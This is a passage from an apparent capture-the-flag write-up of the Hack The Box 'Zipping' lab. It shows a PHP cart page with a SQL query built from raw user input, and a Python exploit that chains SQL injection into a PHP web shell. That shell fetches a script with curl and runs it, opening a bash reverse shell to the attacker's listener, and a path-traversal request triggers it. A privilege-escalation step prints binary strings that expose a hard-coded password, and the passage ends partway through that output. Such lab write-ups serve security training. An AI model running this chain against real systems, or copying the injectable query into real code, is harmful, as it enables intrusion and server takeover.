class="string">&#x27;product_id&#x27;</span>] . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">// Execute the SQL statement without any sanitization or parameter binding</span></span><br><span class="line">        <span class="variable">$product</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">        <span class="comment">// Check if the product exists (array is not empty)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$product</span> &amp;&amp; <span class="variable">$quantity</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Product exists in database, now we can create/update the session variable for the cart</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$product_id</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="comment">// Product exists in cart so just update the quanity</span></span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$product_id</span>] += <span class="variable">$quantity</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Product is not in cart so add it</span></span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$product_id</span>] = <span class="variable">$quantity</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// There are no products in cart, this will add the first product to cart</span></span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>] = <span class="keyword">array</span>(<span class="variable">$product_id</span> =&gt; <span class="variable">$quantity</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Prevent form resubmission...</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: index.php?page=cart&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it&#x27;s a number and check if it&#x27;s in the cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;remove&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;remove&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$_GET</span>[<span class="string">&#x27;remove&#x27;</span>]])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove the product from the shopping cart</span></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$_GET</span>[<span class="string">&#x27;remove&#x27;</span>]]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart page</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// Loop through the post data so we can update the quantities for every product in cart</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$k</span>, <span class="string">&#x27;quantity&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">            <span class="variable">$id</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;quantity-&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$quantity</span> = (<span class="keyword">int</span>)<span class="variable">$v</span>;</span><br><span class="line">            <span class="comment">// Always do checks and validation</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$id</span>]) &amp;&amp; <span class="variable">$quantity</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// Update new quantity</span></span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$id</span>] = <span class="variable">$quantity</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Prevent form resubmission...</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: index.php?page=cart&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send the user to the place order page if they click the Place Order button, also the cart should not be empty</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;placeorder&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?page=placeorder&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;clear&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the session variable for products in cart</span></span><br><span class="line"><span class="variable">$products_in_cart</span> = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) ? <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>] : <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$products</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$subtotal</span> = <span class="number">0.00</span>;</span><br><span class="line"><span class="comment">// If there are products in cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$products_in_cart</span>) &#123;</span><br><span class="line">    <span class="comment">// There are products in the cart so we need to select those products from the database</span></span><br><span class="line">    <span class="comment">// Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)</span></span><br><span class="line">    <span class="variable">$array_to_question_marks</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_fill</span>(<span class="number">0</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$products_in_cart</span>), <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM products WHERE id IN (&#x27;</span> . <span class="variable">$array_to_question_marks</span> . <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    <span class="comment">// We only need the array keys, not the values, the keys are the id&#x27;s of the products</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$products_in_cart</span>));</span><br><span class="line">    <span class="comment">// Fetch the products from the database and return the result as an Array</span></span><br><span class="line">    <span class="variable">$products</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">    <span class="comment">// Calculate the subtotal</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$products</span> <span class="keyword">as</span> <span class="variable">$product</span>) &#123;</span><br><span class="line">        <span class="variable">$subtotal</span> += (<span class="keyword">float</span>)<span class="variable">$product</span>[<span class="string">&#x27;price&#x27;</span>] * (<span class="keyword">int</span>)<span class="variable">$products_in_cart</span>[<span class="variable">$product</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">template_header</span>(<span class="string">&#x27;Zipping | Cart&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">cart</span> <span class="title">content</span>-<span class="title">wrapper</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;<span class="title">Shopping</span> <span class="title">Cart</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">cart</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span> <span class="title">colspan</span>=&quot;2&quot;&gt;<span class="title">Product</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span>&gt;<span class="title">Price</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span>&gt;<span class="title">Quantity</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span>&gt;<span class="title">Total</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">tbody</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">empty</span>($<span class="title">products</span>)): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span> <span class="title">colspan</span>=&quot;5&quot; <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">align</span>:<span class="title">center</span>;&quot;&gt;<span class="title">You</span> <span class="title">have</span> <span class="title">no</span> <span class="title">products</span> <span class="title">added</span> <span class="title">in</span> <span class="title">your</span> <span class="title">Shopping</span> <span class="title">Cart</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">foreach</span> ($<span class="title">products</span> <span class="title">as</span> $<span class="title">product</span>): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span> <span class="title">class</span>=&quot;<span class="title">img</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">product</span>&amp;<span class="title">id</span>=&lt;?=$<span class="title">product</span>[&#x27;<span class="title">id</span>&#x27;]?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">imgs</span>/&lt;?=$<span class="title">product</span>[&#x27;<span class="title">img</span>&#x27;]?&gt;&quot; <span class="title">width</span>=&quot;50&quot; <span class="title">height</span>=&quot;50&quot; <span class="title">alt</span>=&quot;&lt;?=$<span class="title">product</span>[&#x27;<span class="title">name</span>&#x27;]?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">product</span>&amp;<span class="title">id</span>=&lt;?=$<span class="title">product</span>[&#x27;<span class="title">id</span>&#x27;]?&gt;&quot;&gt;&lt;?=$<span class="title">product</span>[&#x27;<span class="title">name</span>&#x27;]?&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">cart</span>&amp;<span class="title">remove</span>=&lt;?=$<span class="title">product</span>[&#x27;<span class="title">id</span>&#x27;]?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">remove</span>&quot;&gt;<span class="title">Remove</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span> <span class="title">class</span>=&quot;<span class="title">price</span>&quot;&gt;&amp;<span class="title">dollar</span>;&lt;?=$<span class="title">product</span>[&#x27;<span class="title">price</span>&#x27;]?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span> <span class="title">class</span>=&quot;<span class="title">quantity</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">number</span>&quot; <span class="title">name</span>=&quot;<span class="title">quantity</span>-&lt;?=$<span class="title">product</span>[&#x27;<span class="title">id</span>&#x27;]?&gt;&quot; <span class="title">value</span>=&quot;&lt;?=$<span class="title">products_in_cart</span>[$<span class="title">product</span>[&#x27;<span class="title">id</span>&#x27;]]?&gt;&quot; <span class="title">min</span>=&quot;1&quot; <span class="title">max</span>=&quot;&lt;?=$<span class="title">product</span>[&#x27;<span class="title">quantity</span>&#x27;]?&gt;&quot; <span class="title">placeholder</span>=&quot;<span class="title">Quantity</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">td</span> <span class="title">class</span>=&quot;<span class="title">price</span>&quot;&gt;&amp;<span class="title">dollar</span>;&lt;?=$<span class="title">product</span>[&#x27;<span class="title">price</span>&#x27;] * $<span class="title">products_in_cart</span>[$<span class="title">product</span>[&#x27;<span class="title">id</span>&#x27;]]?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">tbody</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">subtotal</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">text</span>&quot;&gt;<span class="title">Subtotal</span>&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">price</span>&quot;&gt;&amp;<span class="title">dollar</span>;&lt;?=$<span class="title">subtotal</span>?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">buttons</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Update</span>&quot; <span class="title">name</span>=&quot;<span class="title">update</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Place</span> <span class="title">Order</span>&quot; <span class="title">name</span>=&quot;<span class="title">placeorder</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Clear</span>&quot; <span class="title">name</span>=&quot;<span class="title">clear</span>&quot; <span class="title">onsubmit</span>=&quot;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?=<span class="title">template_footer</span>()?&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<p>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: python3 HTB_Zipping_poc.py &lt;listener ip&gt; &lt;listener port&gt;&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fnb = random.randint(<span class="number">10</span>, <span class="number">10000</span>)</span><br><span class="line">url = <span class="string">&quot;http://zipping.htb/&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp &quot;</span> + <span class="string">f&quot;<span class="subst">&#123;sys.argv[<span class="number">2</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Write php shell /var/lib/mysql/rvsl&quot;</span> + <span class="built_in">str</span>(fnb) + <span class="string">&quot;.php&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;revshell.sh&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;#!/bin/bash\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;bash -i &gt;&amp; /dev/tcp/<span class="subst">&#123;sys.argv[<span class="number">1</span>]&#125;</span>/<span class="subst">&#123;sys.argv[<span class="number">2</span>]&#125;</span> 0&gt;&amp;1&quot;</span>)</span><br><span class="line">proc = subprocess.Popen([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;-m&quot;</span>, <span class="string">&quot;http.server&quot;</span>, <span class="string">&quot;8000&quot;</span>])</span><br><span class="line">phpshell = session.get(url + <span class="string">f&quot;shop/index.php?page=product&amp;id=%0A&#x27;%3bselect+&#x27;&lt;%3fphp+system(\&quot;curl+http%3a//<span class="subst">&#123;sys.argv[<span class="number">1</span>]&#125;</span>:8000/revshell.sh|bash\&quot;)%3b%3f&gt;&#x27;+into+outfile+&#x27;/var/lib/mysql/rvsl<span class="subst">&#123;fnb&#125;</span>.php&#x27;+%231&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Get Reverse Shell&quot;</span>)</span><br><span class="line"></span><br><span class="line">phpshell = session.get(url + <span class="string">f&quot;shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl<span class="subst">&#123;fnb&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">proc.terminate()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20231125211339667.png" alt="image-20231125211339667"></p>
<p><img src="/../images/image-20231125211404167.png" alt="image-20231125211404167"></p>
<p>PE</p>
<p><img src="/../images/image-20231125211510016.png" alt="image-20231125211510016"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">rektsu@zipping:/home/rektsu$ strings /usr/bin/stock</span><br><span class="line">strings /usr/bin/stock</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">mgUa</span><br><span class="line">fgets</span><br><span class="line">stdin</span><br><span class="line">puts</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">fopen</span><br><span class="line">__libc_start_main</span><br><span class="line">fprintf</span><br><span class="line">dlopen</span><br><span class="line">__isoc99_fscanf</span><br><span class="line">__cxa_finalize</span><br><span class="line">strchr</span><br><span class="line">fclose</span><br><span class="line">__isoc99_scanf</span><br><span class="line">strcmp</span><br><span class="line">__errno_location</span><br><span class="line">libc.so.6</span><br><span class="line">GLIBC_2.7</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">GLIBC_2.34</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">PTE1</span><br><span class="line">u+UH</span><br><span class="line">Hakaize</span><br><span class="line">St0ckM4nager</span><br><span class="line">/root/.stock.csv</span><br><span class="line">Enter the password: </span><br><span class="line">Invalid password, please try again.</span><br><span class="line">================== Menu ==================</span><br><span class="line">1) See the stock</span><br><span class="line">2) Edit the stock</span><br><span class="line">3) Exit the program</span><br><span class="line">Select an option: </span><br><span class="line">You <span class="keyword">do</span> not have permissions to <span class="built_in">read</span> the file</span><br><span class="line">File could not be opened.</span><br><span class="line">================== Stock Actual ==================</span><br><span class="line">Colour     Black   Gold    Silver</span><br><span class="line">Amount     %-7d %-7d %-7d</span><br><span class="line">Quality   Excelent Average Poor</span><br><span class="line">Amount    %-9d %-7d %-4d</span><br><span class="line">Exclusive Yes    No</span><br><span class="line">Amount    %-4d   %-4d</span><br><span class="line">Warranty  Yes    No</span><br><span class="line">================== Edit Stock ==================</span><br><span class="line">Enter the information of the watch you wish to update:</span><br><span class="line">Colour (0: black, 1: gold, 2: silver): </span><br><span class="line">Quality (0: excelent, 1: average, 2: poor): </span><br><span class="line">Exclusivity (0: <span class="built_in">yes</span>, 1: no): </span><br><span class="line">Warranty (0: <span class="built_in">yes</span>, 1: no): </span><br><span class="line">Amount: </span><br><span class="line">Error: The information entered is incorrect</span><br><span class="line">%d,%d,%d,%d,%d,%d,%d,%d,%d,%d</span><br><span class="line">The stock has been updated correctly.</span><br><span class="line">;*3$<span class="string">&quot;</span></span><br><span class="line"><span class="string">GCC: (Debian 12.2.0-3) 12.2.0</span></span><br><span class="line"><span class="string">Scrt1.o</span></span><br><span class="line"><span class="string">__abi_tag</span></span><br><span class="line"><span class="string">crtstuff.c</span></span><br><span class="line"><span class="string">deregister_tm_clones</span></span><br><span class="line"><span class="string">__do_global_dtors_aux</span></span><br><span class="line"><span class="string">completed.0</span></span><br><span class="line"><span class="string">__do_global_dtors_aux_fini_array_entry</span></span><br><span class="line"><span class="string">frame_dummy</span></span><br><span class="line"><span class="string">__frame_dummy_init_array_entry</span></span><br><span class="line"><span class="string">stock.c</span></span><br><span class="line"><span class="string">__FRAME_END__</span></span><br><span class="line"><span class="string">_DYNAMIC</span></span><br><span class="line"><span class="string">__GNU_EH_FRAME_HDR</span></span><br><span class="line"><span class="string">_GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"><span class="string">__libc_start_main@GLIBC_2.34</span></span><br><span class="line"><span class="string">__errno_location@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">_ITM_deregisterTMCloneTable</span></span><br><span class="line"><span class="string">__isoc99_fscanf@GLIBC_2.7</span></span><br><span class="line"><span class="string">puts@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">stdin@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">_edata</span></span><br><span class="line"><span class="string">fclose@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">_fini</span></span><br><span class="line"><span class="string">strchr@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">fgets@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__data_start</span></span><br><span class="line"><span class="string">strcmp@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">dlopen@GLIBC_2.34</span></span><br><span class="line"><span class="string">fprintf@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__gmon_start__</span></span><br><span class="line"><span 